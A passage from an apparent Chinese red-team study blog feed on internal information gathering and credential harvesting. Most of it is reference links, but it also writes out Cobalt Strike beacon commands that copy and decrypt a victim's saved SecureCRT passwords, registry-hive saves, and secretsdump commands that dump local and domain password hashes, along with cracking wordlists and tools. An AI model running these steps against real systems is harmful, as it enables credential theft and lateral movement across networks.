href="#6-1-3-第三方组件提权" class="headerlink" title="6.1.3 第三方组件提权"></a>6.1.3 第三方组件提权</h4><p>权限提升参考总文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.secpulse.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">138197</span>.html</code></pre>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队攻防学习之内部信息收集</title>
    <link href="/p/56572a0f.html"/>
    <url>/p/56572a0f.html</url>
    
    <content type="html"><![CDATA[<h1 id="五、内部信息收集"><a href="#五、内部信息收集" class="headerlink" title="五、内部信息收集"></a>五、内部信息收集</h1><h2 id="1、本地信息搜集"><a href="#1、本地信息搜集" class="headerlink" title="1、本地信息搜集"></a>1、本地信息搜集</h2><h3 id="1-1、用普通权限的域帐户获得域环境中所有DNS解析记录"><a href="#1-1、用普通权限的域帐户获得域环境中所有DNS解析记录" class="headerlink" title="1.1、用普通权限的域帐户获得域环境中所有DNS解析记录"></a>1.1、用普通权限的域帐户获得域环境中所有DNS解析记录</h3><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>beta.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/web/</span><span class="hljs-number">17955</span>.html  --原文https:<span class="hljs-regexp">//</span>nosec.org<span class="hljs-regexp">/home/</span>detail/<span class="hljs-number">2527</span>.html</code></pre><hr><h3 id="1-2、令牌Token和会话Session原理与攻略"><a href="#1-2、令牌Token和会话Session原理与攻略" class="headerlink" title="1.2、令牌Token和会话Session原理与攻略"></a>1.2、令牌Token和会话Session原理与攻略</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/huangsheng/</span>p/<span class="hljs-number">10736796</span>.html</code></pre><h3 id="1-3、内存转储-获取本地hash"><a href="#1-3、内存转储-获取本地hash" class="headerlink" title="1.3、内存转储-获取本地hash"></a>1.3、内存转储-获取本地hash</h3><p>参考文章：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.secwk.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">09</span><span class="hljs-regexp">/08/</span><span class="hljs-number">6372</span>/</code></pre><hr><h3 id="1-4、转储域账户哈希值"><a href="#1-4、转储域账户哈希值" class="headerlink" title="1.4、转储域账户哈希值"></a>1.4、转储域账户哈希值</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>scarletf.github.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">09</span><span class="hljs-regexp">/03/</span>域渗透-导出域用户Hash方法/https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2527</span>   ---如何Dump域内的Hashhttps:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1165439</span>   --导出域内用户hash的几种方法</code></pre><p>这几种方法，结合下思想<br>然后书中的两个续集思路…</p><hr><h3 id="1-5、SPN发现与利用"><a href="#1-5、SPN发现与利用" class="headerlink" title="1.5、SPN发现与利用"></a>1.5、SPN发现与利用</h3><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://sec.thief.one/article_content?a_id=<span class="hljs-number">594539</span>e<span class="hljs-number">5</span>b<span class="hljs-number">195</span>b<span class="hljs-number">5</span>fc<span class="hljs-number">38051</span>bf<span class="hljs-number">7</span>fb<span class="hljs-number">438524</span>   --详细文章</code></pre><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>rcoil.me<span class="hljs-regexp">/2019/</span><span class="hljs-number">06</span><span class="hljs-regexp">/【域渗透】SPN%20扫描利用/</span>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">174229</span>.html   --老文章  SPN服务主体名称发现详解</code></pre><p>想要继续了解的可以查看这两篇文章，巩固下</p><hr><h3 id="1-6哈希传递攻击利用"><a href="#1-6哈希传递攻击利用" class="headerlink" title="1.6哈希传递攻击利用"></a>1.6哈希传递攻击利用</h3><p>参考文献：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>saucer-man.com<span class="hljs-regexp">/information_security/</span><span class="hljs-number">443</span>.html<span class="hljs-comment">#cl-11</span>https:<span class="hljs-regexp">//</span>saucer-man.com<span class="hljs-regexp">/information_security/</span><span class="hljs-number">79</span>.html<span class="hljs-comment">#cl-13</span>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">217681</span>.htmlhttps:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_36119192/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">104802921</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Mikasa-Ackerman/</span>p/hou-shen-tou-zhong-de-mi-ma-zhua-qu.html</code></pre><hr><h2 id="2、用户习惯"><a href="#2、用户习惯" class="headerlink" title="2、用户习惯"></a>2、用户习惯</h2><h3 id="2-1-从目标文件中做信息搜集第一季"><a href="#2-1-从目标文件中做信息搜集第一季" class="headerlink" title="2.1 从目标文件中做信息搜集第一季"></a>2.1 从目标文件中做信息搜集第一季</h3><p>ExifTool可读写及处理图像、视频及音频，例如Exif、IPTC、XMP、JFIF、GeoTIFF、ICC Profile。包括许多相机的制造商信息读取，如佳能，卡西欧，大疆，FLIR，三星等<br><code>exiftool -lang zh-cn -a -u -g1 ./sample.php.png </code></p><p>在大型内网渗透中，尤其是针对办公机的渗透，需要熟知目标集体或者个人的作息时间，工作时间，文档时间，咖啡时间，或者需要从某些文件中获取对方的真实拍摄地坐标等。那么无疑需要快速的从大量文件中筛选信息诉求。当目标越复杂，文件中的信息搜集就更为重要。如文档作者，技术文章作者，财务文档作者等，熟知在大量人员，获取对方职务，大大减少渗透过程中的无用性，重复性，可见性。与暴露性。而作为公司，应该熟悉相关文档的内置属性，尤其是在共享文件服务器上，删除或者复写敏感信息来降低企业安全风险。</p><p>本篇意旨企业安全在处理本公司相关敏感文件以及重要文件应做好更多的防范，尤其是重要部门，如研发，财务等。</p><hr><h3 id="2-2、获取当前系统所有用户的谷歌浏览器密码"><a href="#2-2、获取当前系统所有用户的谷歌浏览器密码" class="headerlink" title="2.2、获取当前系统所有用户的谷歌浏览器密码"></a>2.2、获取当前系统所有用户的谷歌浏览器密码</h3><p>参考文章：</p><ul><li><a href="https://cloud.tencent.com/developer/article/1512066">https://cloud.tencent.com/developer/article/1512066</a></li></ul><hr><h3 id="2-3、adsutil-vbs-获取密码"><a href="#2-3、adsutil-vbs-获取密码" class="headerlink" title="2.3、adsutil.vbs 获取密码"></a>2.3、adsutil.vbs 获取密码</h3><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.<span class="hljs-number">5</span>dmail.net<span class="hljs-regexp">/html/</span><span class="hljs-number">2007</span>-<span class="hljs-number">5</span>-<span class="hljs-number">9</span>/<span class="hljs-number">20075901045</span>.htmhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/94YY/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">05</span><span class="hljs-regexp">/28/</span><span class="hljs-number">2060887</span>.html</code></pre><p>这很老的知识点，当做一种思路吧…</p><hr><h3 id="2-4、解密目标机器保存的rdp凭证"><a href="#2-4、解密目标机器保存的rdp凭证" class="headerlink" title="2.4、解密目标机器保存的rdp凭证"></a>2.4、解密目标机器保存的rdp凭证</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">6</span>c11412947e5    --mimikatz获取https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/y</span>J4z    ---lsass获取https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/0xdd/</span>p/<span class="hljs-number">11394566</span>.html</code></pre><p>这个方法很简单，看看就记住了…</p><hr><h3 id="2-5、Hashcat-神器详解"><a href="#2-5、Hashcat-神器详解" class="headerlink" title="2.5、Hashcat 神器详解"></a>2.5、Hashcat 神器详解</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4008</span>   --详细https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/smli_ng/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106111493</span></code></pre><p>这里遇到了就来查…</p><h4 id="字典集合分享"><a href="#字典集合分享" class="headerlink" title="字典集合分享"></a><strong>字典集合分享</strong></h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm https:<span class="hljs-regexp">//</span>weakpass.com/download http:<span class="hljs-regexp">//</span>ophcrack.sourceforge.net/tables.php https:<span class="hljs-regexp">/github.com/</span>fuzzdb-project/fuzzdb https:<span class="hljs-regexp">//</span>wiki.skullsecurity.org/passwords<span class="hljs-comment">#Password_dictionaries</span></code></pre><p>战略支援部近期会对网络上的字典进行下载整理汇总,形成较完整的字典表…拿走</p><h4 id="其他暴力破解软件"><a href="#其他暴力破解软件" class="headerlink" title="其他暴力破解软件"></a><strong>其他暴力破解软件</strong></h4><pre><code class="hljs ada">Aircrack-ng-WIFI破解工具 John The Ripper<span class="hljs-comment">--功能强大的破解工具包 </span>Medusa<span class="hljs-comment">--在线破解工具 </span>Ophcrack<span class="hljs-comment">--LM-Hash破解神器 </span>THC Hydra<span class="hljs-comment">--在线破解工具 </span>WFUZZ<span class="hljs-comment">--WebFuzz神器</span></code></pre><h4 id="在线解Hash网站"><a href="#在线解Hash网站" class="headerlink" title="在线解Hash网站"></a><strong>在线解Hash网站</strong></h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cmd5.com/ https:<span class="hljs-regexp">//</span>crackstation.net/https:<span class="hljs-regexp">//</span>www.onlinehashcrack.com/ tps:<span class="hljs-regexp">/www.objectif-securite.ch/</span>ophcrack.php https:<span class="hljs-regexp">//</span>hce.iteknical.com/</code></pre><hr><h3 id="2-6、解密Winscp和SecureCRT客户端中保存的密码hash"><a href="#2-6、解密Winscp和SecureCRT客户端中保存的密码hash" class="headerlink" title="2.6、解密Winscp和SecureCRT客户端中保存的密码hash"></a>2.6、解密Winscp和SecureCRT客户端中保存的密码hash</h3><h4 id="Winscp"><a href="#Winscp" class="headerlink" title="Winscp"></a>Winscp</h4><p>到时候补充吧</p><h4 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h4><p><strong>前言</strong></p><p>SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。</p><p>所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用结尾处的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了<br><strong>确定目标SecureCRT的详细版本</strong></p><p>想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）</p><pre><code class="hljs gradle">beacon&gt; powershell-<span class="hljs-keyword">import</span> <span class="hljs-regexp">/Users/</span>anonysec/ListInstalledPrograms.ps1beacon&gt; powershell Get-list</code></pre><p><strong>确定SecureCRT配置文件目录下的Sessions目录</strong></p><p>默认情况下，SecureCRT的Config目录路径为：%APPDATA%\VanDyke\Config\Sessions\</p><p>如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认<br>Sessions目录下的每个ini文件都会以连接的IP或域名来命名</p><pre><code class="hljs taggerscript">beacon&gt;shell dir <span class="hljs-variable">%APPDATA%</span><span class="hljs-symbol">\V</span>anDyke<span class="hljs-symbol">\C</span>onfig<span class="hljs-symbol">\S</span>essions\</code></pre><p><strong>拷贝下载Sessions目录的ini文件</strong></p><p>直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。</p><pre><code class="hljs taggerscript">beacon&gt; powershell-import /Users/anonysec/Invoke-NinjaCopy.ps1beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\r</span>00t<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\V</span>anDyke<span class="hljs-symbol">\C</span>onfig<span class="hljs-symbol">\S</span>essions<span class="hljs-symbol">\1</span>92.168.144.128.ini&quot; -LocalDestination &quot;c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini&quot;beacon&gt; shell dir c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini beacon&gt; download c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini</code></pre><p><strong>脚本解密Session</strong></p><p>将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> pip<span class="hljs-number">2</span> install pycrypto</code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">SecureCRT-decryptpass</span><span class="hljs-selector-class">.py</span> 192.168.144.128<span class="hljs-selector-class">.ini</span></code></pre><p><strong>SecureCRT高版本解决</strong></p><p>如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\VanDyke\Config\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。</p><p>目标SecureCRT版本与本地版本需一致，否则可能会出现问题</p><h4 id="附上脚本"><a href="#附上脚本" class="headerlink" title="附上脚本"></a>附上脚本</h4><p>Winscp:<br><a href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p><p><a href="https://bitbucket.org/knarf/winscppwd/downloads/winscppwd.exe">winscppwa.exe</a> –目前无法连接</p><p>SecureCRT：<br><a href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a></p><p><a href="https://github.com/gitPoc32/Forensic/blob/5c82582d21811a2257e3f68bd95f5e8735d834cd/VanDykeSecureCRT/SecureCRT-decryptpass.py">SecureCRT-decryptpass.py</a></p><hr><h3 id="2-7、破解Weblogic配置文件中的数据库密码"><a href="#2-7、破解Weblogic配置文件中的数据库密码" class="headerlink" title="2.7、破解Weblogic配置文件中的数据库密码"></a>2.7、破解Weblogic配置文件中的数据库密码</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>web/<span class="hljs-number">220147</span>.html  --这篇集合了很多思路和方法树上介绍了使用工具WebLogicPWV1.<span class="hljs-number">0</span>.jar进行破解</code></pre><p>这里如果进行config.xml获得hash破解密码，需要去两次密码…</p><hr><h3 id="2-8、获取域控-系统日志"><a href="#2-8、获取域控-系统日志" class="headerlink" title="2.8、获取域控/系统日志"></a>2.8、获取域控/系统日志</h3><h4 id="dumpel"><a href="#dumpel" class="headerlink" title="dumpel"></a>dumpel</h4><h5 id="1、windows系统日志的存储："><a href="#1、windows系统日志的存储：" class="headerlink" title="1、windows系统日志的存储："></a>1、windows系统日志的存储：</h5><p>windows的系统日志存储在C:\WINDOWS\system32\config目录，文件后缀为evt。</p><h5 id="2、导出工具："><a href="#2、导出工具：" class="headerlink" title="2、导出工具："></a>2、导出工具：</h5><p>使用dumpel.exe可以导出windows的系统日志。</p><p>dumpel.exe可以去微软官网下载，地址：<a href="http://support.microsoft.com/kb/927229%E3%80%82">http://support.microsoft.com/kb/927229。</a></p><p>下载后的dumpel.exe是个安装文件，安装完后可以在安装目录找到一个dumpel.exe，我们需要的是安装后的dumpel.exe。</p><h5 id="3、导出脚本："><a href="#3、导出脚本：" class="headerlink" title="3、导出脚本："></a>3、导出脚本：</h5><p>直接使用dumpel.exe不容易实现自动定期导出系统日志。所以需要编写个脚本。脚本内容：</p><pre><code class="hljs javascript"><span class="hljs-comment">//获得YYYYMMDD格式的当前时间</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCurYYYYMMDD</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">var</span> today = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();<span class="hljs-keyword">var</span> year = today.getYear();<span class="hljs-keyword">var</span> month = today.getMonth() + <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (month &lt; <span class="hljs-number">10</span>) &#123;month = <span class="hljs-string">&quot;0&quot;</span> + month;&#125;<span class="hljs-keyword">var</span> date = today.getDay();<span class="hljs-keyword">if</span> (date &lt; <span class="hljs-number">10</span>)&#123;date = <span class="hljs-string">&quot;0&quot;</span> + date;&#125;<span class="hljs-keyword">return</span> year + <span class="hljs-string">&quot;&quot;</span> + month + <span class="hljs-string">&quot;&quot;</span> + date;&#125;<span class="hljs-comment">//补齐目录结尾的&#x27;\&#x27;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeDir</span>(<span class="hljs-params">str</span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span> (str.charAt(str.length - <span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;\\&#x27;</span>)&#123;<span class="hljs-keyword">return</span> str + <span class="hljs-string">&quot;\\&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> str;&#125;&#125; <span class="hljs-comment">//处理命令行参数</span><span class="hljs-keyword">var</span> args = WScript.Arguments;<span class="hljs-keyword">var</span> days = <span class="hljs-number">1</span>;<span class="hljs-keyword">var</span> path = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">var</span> exepath = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; args.length; i++)&#123;<span class="hljs-keyword">var</span> a = args(i);<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-e&quot;</span>) == <span class="hljs-number">0</span>)&#123;exepath = a.substring(<span class="hljs-number">2</span>, a.length);&#125;<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-p&quot;</span>) == <span class="hljs-number">0</span>)&#123;path = a.substring(<span class="hljs-number">2</span>, a.length);&#125;<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-d&quot;</span>) == <span class="hljs-number">0</span>)&#123;days = a.substring(<span class="hljs-number">2</span>, a.length);&#125;&#125; <span class="hljs-comment">//补齐目录结尾的&#x27;\&#x27;</span>exepath = makeDir(exepath);path = makeDir(path); <span class="hljs-comment">//获取当前时间</span><span class="hljs-keyword">var</span> YYYYMMDD = getCurYYYYMMDD();<span class="hljs-keyword">var</span> YYYYMM = YYYYMMDD.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>); <span class="hljs-comment">//判断按月存放的目录是否存在</span><span class="hljs-keyword">var</span> fso = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>);<span class="hljs-keyword">if</span> (fso.FolderExists(path + YYYYMM) != <span class="hljs-literal">true</span>)&#123;fso.CreateFolder(path + YYYYMM);&#125; <span class="hljs-comment">//执行程序，导出日志</span><span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.shell&quot;</span>);ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; application&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_app.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; security&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_sec.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; system&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_sys.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);</code></pre><h5 id="4、执行命令："><a href="#4、执行命令：" class="headerlink" title="4、执行命令："></a>4、执行命令：</h5><p>cscript bak_win_log.js -eD:\Desktop -pD:\winlog -d7</p><p>使用windows的任务计划执行该命令就实现了定期导出。</p><p>dumpel的安装目录里的dumpel_d.htm是使用说明</p><hr><h4 id="wevtutil"><a href="#wevtutil" class="headerlink" title="wevtutil"></a>wevtutil</h4><p>直接上看微软详情吧：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>windows-server<span class="hljs-regexp">/administration/</span>windows-commands/wevtutil</code></pre><h4 id="psloglist"><a href="#psloglist" class="headerlink" title="psloglist"></a>psloglist</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/-zhong/</span>p/<span class="hljs-number">11743489</span>.htmlhttps:<span class="hljs-regexp">//</span>wenku.baidu.com<span class="hljs-regexp">/view/</span>c2e9139803d8ce2f006623ff.html?from=search   --最详细的解释</code></pre><h2 id="3、网络信息收集"><a href="#3、网络信息收集" class="headerlink" title="3、网络信息收集"></a>3、网络信息收集</h2><h3 id="3-1、发现目标WEB程序敏感目录"><a href="#3-1、发现目标WEB程序敏感目录" class="headerlink" title="3.1、发现目标WEB程序敏感目录"></a>3.1、发现目标WEB程序敏感目录</h3><p>就一目录扫描工具，可以使用其他代替。<br>参考文章：</p><p><a href="https://micro8.gitbook.io/micro8/contents-1/21-30/29-fa-xian-mu-biao-web-cheng-xu-min-gan-mu-lu-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/21-30/29-fa-xian-mu-biao-web-cheng-xu-min-gan-mu-lu-di-yi-ji</a></p><hr><h3 id="3-2、基于SCF做目标内网信息搜集"><a href="#3-2、基于SCF做目标内网信息搜集" class="headerlink" title="3.2、基于SCF做目标内网信息搜集"></a>3.2、基于SCF做目标内网信息搜集</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lshack.cn<span class="hljs-regexp">/642/</span>https:<span class="hljs-regexp">//gi</span>tlab.com<span class="hljs-regexp">/Tomotoes/</span>Micro8<span class="hljs-regexp">/-/</span>blob<span class="hljs-regexp">/b7c284fdbb53ff8ee60acff92d5ebbf1559dfd92/</span>第一百零一课：基于SCF做目标内网信息搜集第二季.pdf</code></pre><p>感谢Micro8大佬退役最后给出的文章思路…</p><hr><h3 id="3-3、内网漏洞快速检测技巧"><a href="#3-3、内网漏洞快速检测技巧" class="headerlink" title="3.3、内网漏洞快速检测技巧"></a>3.3、内网漏洞快速检测技巧</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2354</span>   --goodhttps:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">199012</span></code></pre><h3 id="3-4-域环境信息搜集"><a href="#3-4-域环境信息搜集" class="headerlink" title="3.4 域环境信息搜集"></a>3.4 域环境信息搜集</h3><h4 id="3-4-1、Active-Directory-Domain-Services-获取域控信息"><a href="#3-4-1、Active-Directory-Domain-Services-获取域控信息" class="headerlink" title="3.4.1、Active Directory Domain Services - 获取域控信息"></a>3.4.1、Active Directory Domain Services - 获取域控信息</h4><p>参考文章：<code>https://payloads.online/archivers/2019-04-12/1</code> 感谢倾旋</p><hr><h4 id="3-4-2、Windows域渗透-用户密码枚举"><a href="#3-4-2、Windows域渗透-用户密码枚举" class="headerlink" title="3.4.2、Windows域渗透-用户密码枚举"></a>3.4.2、Windows域渗透-用户密码枚举</h4><p>参考文章：<code>https://payloads.online/archivers/2018-05-02/1</code> 感谢倾旋</p><hr><h4 id="3-4-3、不同环境下域dns记录信息收集方法"><a href="#3-4-3、不同环境下域dns记录信息收集方法" class="headerlink" title="3.4.3、不同环境下域dns记录信息收集方法"></a>3.4.3、不同环境下域dns记录信息收集方法</h4><p>书上介绍了DNS信息查询方法：</p><pre><code class="hljs nginx"><span class="hljs-attribute">DNS</span> ManagerDnscmd使用 Powershell进行dns信息查询adidnsdumpSharpAdidnsdump</code></pre><p>五种方法来获取不通环境下域dns信息，这里后期科补~~~</p><hr><h4 id="3-4-4、impacket框架之域信息获取"><a href="#3-4-4、impacket框架之域信息获取" class="headerlink" title="3.4.4、impacket框架之域信息获取"></a>3.4.4、impacket框架之域信息获取</h4><p>本篇文章讲述impacket套件内部分常用域、内网信息收集工具使用，将会用到的工具，secretsdump、lookupsid、 esentutl、ticketer</p><h5 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h5><p>Secretsdump常用于本地、远程hash导出，具体使用方法如下：</p><p>在渗透测试工作中，为了躲避杀软等防护产品，dump目标机hash通常会进行以下操作。</p><pre><code class="hljs livescript">C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\sam</span> c:<span class="hljs-string">\sam.save</span>C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\security</span> c:<span class="hljs-string">\security.save</span> C:<span class="hljs-string">\&gt;</span> reg.exe save hklm<span class="hljs-string">\system</span> c:<span class="hljs-string">\system.save</span></code></pre><p>以上三个注册表项解释:</p><pre><code class="hljs pgsql">SAM存储域用户或本地用户的数据，包括域用户组名或本机用户组、用户名及密码哈希等。<span class="hljs-keyword">Security</span>存储用户安全策略，存储域用户、本地用户登陆记录，缓存的登陆用户凭证，例如<span class="hljs-keyword">domain</span> <span class="hljs-keyword">cache</span>system用来解密SAM和Security</code></pre><p>之后使用secretsdump进行hash内容导出，具体方法如下:</p><p><strong>1）本地hash导出</strong></p><p>获取SAM中hash</p><pre><code class="hljs maxima">secretsdump.py -sam sam.<span class="hljs-built_in">save</span> -<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span> LOCAL</code></pre><p>获取security.save中缓存的登陆用户凭证和LSA Secres</p><pre><code class="hljs pgsql">secretsdump.py -<span class="hljs-keyword">security</span> <span class="hljs-keyword">security</span>.save -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.save <span class="hljs-keyword">LOCAL</span></code></pre><p>获取sam security 中所有内容</p><pre><code class="hljs maxima">secretsdump.py -sam sam.<span class="hljs-built_in">save</span> -security security.<span class="hljs-built_in">save</span> -<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span> LOCAL</code></pre><p><strong>2）域用户hash导出</strong></p><p>域用户hash导出还需要NTDS.dit活动目录数据库文件，具体导出方法请查看gitbook《转储域账 户哈希值》</p><p>使用以下命令导出域所有用户hash</p><pre><code class="hljs vim"><span class="hljs-keyword">python</span> secretsdump.<span class="hljs-keyword">py</span> -ntds NTDS.dit -<span class="hljs-built_in">system</span> SYSTEM LOCAL -outputfile<span class="hljs-keyword">lol</span>.hash</code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">secretsdump</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-ntds</span> <span class="hljs-selector-tag">NTDS</span><span class="hljs-selector-class">.dit</span> <span class="hljs-selector-tag">-system</span> <span class="hljs-selector-tag">temp_sys</span><span class="hljs-selector-class">.hiv</span> <span class="hljs-selector-tag">LOCAL-outputfile</span> <span class="hljs-selector-tag">lol</span><span class="hljs-selector-class">.hash</span></code></pre><pre><code class="hljs llvm">proxychains python secretsdump.py rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre><p><strong>3）远程导出hash</strong></p><p>secretsdump还支持远程导岀hash，支持socks代理传输数据，需提供远程服务器管理员账号凭证，支持两种方式读取活动目录数据库，Vssadmin和DRSUAPI(Directory Replication Service API)远程目录复制协议api</p><p>导出远程机hash及缓存记录</p><pre><code class="hljs llvm">secretsdump.exe rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre><p>使用 Vssadmin复制用户数据库文件的方式进行远程hash导出</p><pre><code class="hljs llvm">secretsdump.exe rootkit/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> -just-dc 